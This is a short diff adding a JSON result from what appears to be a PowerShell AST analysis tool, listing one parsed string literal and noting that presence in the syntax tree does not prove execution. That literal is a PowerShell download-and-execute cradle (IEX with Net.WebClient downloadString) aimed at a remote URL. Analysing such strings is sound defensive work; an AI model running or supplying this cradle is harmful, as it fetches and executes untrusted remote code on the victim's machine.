@@ -1,0 +1,11 @@
+{
+  "limitation": "AST presence does not prove execution: unreachable code, functions and conditions need context.",
+  "parsed_only": true,
+  "commands": [],
+  "string_literals": [
+    "IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')"
+  ],
+  "member_invocations": [],
+  "parse_errors": [],
+  "powershell_version": "7.6.5"
+}
